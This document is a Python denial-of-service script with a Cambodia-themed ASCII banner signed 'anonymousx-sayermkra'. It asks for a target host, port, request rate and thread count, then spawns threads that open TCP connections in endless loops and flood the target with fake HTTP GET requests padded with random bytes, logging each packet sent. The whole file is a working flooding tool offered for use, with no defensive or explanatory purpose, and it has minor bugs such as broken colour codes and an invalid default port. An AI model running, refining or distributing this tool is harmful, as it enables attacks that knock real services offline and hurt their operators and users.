

import socket
import time
import os
import random

from threading import Thread

os.system("clear")

if not __name__ == "__main__":
    exit()
      
class ConsoleColors:
    HEADER = '\033[95mkra'
    OKBLUE = '\033[94mkra'
    OKGREEN = '\033[92'
    WARNING = '\033[93makra'
    FAIL = '\033[91m'
    BOLD = '\033[1makra'
    
print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
               
               
               
               
                                                                                                                  
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^:.::^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^::::::^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^::::::::^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^:::......:::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~!!7?????7?7~~~~~~~~~~~~~~~~~~~~~~~~~^^~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~^::^~~~~~~~~~~~~~~~~~~~~~JGBBBBBBBBBBBGG7~~~~~~~~~~~~~~~~~~~~~^::^~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~^::::^~~~~~~~~~~~~~~~~~~~!YGBBBBBBBBBBBBGJ~~~~~~~~~~~~~~~~~~~~^::::^~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~^^^^~~~~~~~~~~~~~~~~~~~~!YGPP5YJJJJYPPGGJ~~~~~~~~~~~~~~~~~~~^~^^^^^^~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~!!!!!!!!!~~~~~~~~~~~~~~~~~~~!J7!J!^!! :!7J?!~~~~~~~~~~~~~~~~~~~!!!!!!!!~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~!!!!!!!!!!~~~~~~~~~~~~~~~~7?PY75BBP!~!5P7YG57!~~~~~~~~~~~~~~~~!!!!!!!!!!!~~~~~~~~~~~~~
~~~~~~~~~~~!7!!!!!!!!!!!!~~~~~~~~~~~~~~?BB57PBGGP!5BGBP75GGG7~~~~~~~~~~~~~!!!!!!!!!!!!!!~~~~~~~~~~~~
~~~~~~~~~~~~!!!!!!!!!!!!!!~~~~~~~~~~~!77J?!?JJJJ?:!JJJJ?!?JJ77~~~~~~~~~~~~!!!!!!!!!!!!!!~~~~~~~~~~~~
~~~~~~~~~!!!!!!!!!!!!!!!!^~~~~~~~~~~~?BGG7JBGBGGP7YGGBBBJ?GGGG?~~~~~~~~!7~~!!!!!!!!!!!!!!!!~~~~~~~~~
~~~~~~~!!!!!!!!!!!!!!!!!^75Y:~^7Y?!YY5BBG!5P5J7GG7YB575PJ!GBBB5Y77YJ^~:JGY^!!!!!!!!!!!!!!!!!!~~~~~~~
~~~~~~~!!!!!!!!!!!!!!!!!^5P5?.?5BJ7PGPPPY::.. ^GBYPBY  ...YPPPPGY!GPY~!55G~~!!!!!!!!!!!!!!!!!~~~~~~~
~~~~~~~!!!!!!!!!!!!!!!!!^PP!55?YBJ7YYYYYJ.    .5B75B7     ~YYYYY?!GG75P7YB7~!!!!!!!!!!!!!!!!!~~~~~~~
~~~~~~~!!!!!!!!!!!!!!!!!^PBJ7J7PGY7BBBBBJ      ^5~Y?      ^GBBBBJ7GPJ7??PB!~!!!!!!!!!!!!!!!!!~~~~~~~
~~~~~~~~!!!!!!!!!!!!!!!!^YP?Y?5?JG7YBBBB~       ...        JBBBP!5G~P?Y?JG^~!!!!!!!!!!!!!!!!~~~~~~~~
~~~~~~~~!!!!!!!!!!!!!!!!~~G?^7G!~G57J55J.                  ^5YY7YG5.5?^!GY^!!!!!!!!!!!!!!!!!~~~~~~~~
~~~~~~~~!!!!!!!!!!!!!!777~JB5!!~^PJP7!YJ.                  !57!5YY?.!!YBP^~!!!!!!!77!!!!!!!!~~~~~~~~
~~~~~~~~!!!!!!!!!!!!!7JY?!^JB5J?7P??GY?JY!:             .^?JJJPY7P??JYGP~~!!!!!!!77!!!!!!!!!~~~~~~~~
~~~~~~~~!7!!!!!!!!!!!!77!!!~?G5J?JY7Y5?YYY7.            :?JY?J57?J??5GY~~!!!!!!!!!!!!!!!!!!!~~~~~~~~
~~~~~~~~!!!!!!!!!!!!!!!!!!!!~!5BPJJ??5J!?Y7             :YJ!7Y???J5BG?^!!!!!!!!!!!!!!!!!!!!!!~~~~~~~
~~~~~!!!!!!!~~~~~~~~~~~~~~~~~~^!5G5?7!77?7:              !??7!!?YPP?^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~^^^^^^^^:::::::::::::::::::::~YGG5J77!!:           .~!!?JYPG57^.::::::::::::::::::::::::::::^^~~
~~^^^^^^^^^^:::::::::^^^^^^::::::::^!?5PGGB7 ..        :GBGGPY7^:.::::::::::::::::::::::::::::::::^~
~~^^^^^^^^^^^::::::^^^^^^^^^^::::::::::^~!?!.......... :J7!^:::::::::::::::::::::::::::::::::::::::^
~~^^^^^^^^^^^:::::^^^^^^^^^^^^:::^^::::::::.::.::^::::...::::^::::::::::::::::::::::::::::::::::::::
^^^^^^^^^^^^^^:::::^^^^^^^^^^::?GJYY^~77^!??7!7^7B!!^:7?7:~7?#~Y~:!!^:::::::::::::::::::::::::::::::
^^^^^^^^^^^^^^^::::::^^^^^^^:::GG:^7~P5&YPB!@J5G?&7G55G!#Y#YJ&!#!Y5BG:::::::::::::::::::::::::::::::
77!~~^^^^^^^^^^:^^^::::::::::::!PJYY!GYGJYY^G~7P7B?PJ?PJP!Y5JB!B!P5PG:::::::::::::::::::::::::::::::
........                         ..   .        .....  ..   ... . ....                         
                                    anonymousx-sayermkra
                                    I love Cambodia
                                      Cambodia 🌹
                         
               
               
               
               

                       
               
               
               
               
      ''')
      
    
def getport():
    try:
        p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
        return p
    except ValueError:
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
        return 8000000

host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "ផ្ទះ ip :\r\n")
port = getport()
speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run:\r\n"))
threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count:\r\n"))

ip = socket.gethostbyname(host)

bytesToSend = random._urandom(2450)

i = 1000;



class Count:
    packetCounter = 1

def goForDosThatThing():
    try:
        while True:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dosSocket.connect((ip, port))
                for i in range(speedPerRun):
                    try:
                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----🥀PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " -----🥀")
                        Count.packetCounter = Count.packetCounter + 1
                    except socket.error:
                        print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
                    except KeyboardInterrupt:
                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            except socket.error:
                print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
            except KeyboardInterrupt:
                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            dosSocket.close()
    except KeyboardInterrupt:
        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
try:
        
    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
    
    
    
    
    
    
    
    
    
    
    
    
    
          ''')
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====    🇰🇭           ] 25%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========     🇰🇭     ] 50%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [=============== 🇰🇭     ] 75%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%")
    
    for i in range(threads):
        try:
            t = Thread(target=goForDosThatThing)
            t.start()
        except KeyboardInterrupt:
            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
except KeyboardInterrupt:
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")